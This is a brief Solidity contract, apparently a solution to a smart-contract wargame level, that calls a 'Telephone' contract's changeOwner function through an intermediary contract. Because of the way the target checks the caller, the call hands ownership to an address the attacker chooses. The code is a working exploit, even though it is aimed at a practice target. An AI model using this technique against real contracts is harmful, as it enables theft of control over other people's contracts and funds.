// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {

  Telephone victimContract;

  constructor(address _victimContractAddress) public {
    victimContract = Telephone(_victimContractAddress);
  }

  function changeOwner(address _owner) public {
    victimContract.changeOwner(_owner);
  }
}